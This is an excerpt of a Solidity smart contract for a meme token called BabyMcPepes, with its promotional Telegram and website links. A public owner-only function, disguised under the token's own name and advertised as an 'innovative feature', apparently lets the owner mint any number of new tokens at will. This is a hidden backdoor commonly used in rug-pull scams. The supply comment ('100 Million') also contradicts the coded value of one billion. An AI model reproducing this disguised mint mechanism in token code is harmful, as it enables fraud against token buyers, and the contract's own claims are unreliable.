...
//
// $BabyMcPepes proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyMCPepesBsc
// 📱 Website ::https://babymcpepes.xyz/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyMcPepes(uint256 amount) public onlyOwner {
 _BabyMcPepes(msg.sender, amount);
    }
    ...
    function _BabyMcPepes(address account, uint256 amount) internal virtual {
...
contract $BabyMcPepes is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("BabyMcPepes", "BBPEPES") {
     _BabyMcPepes(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}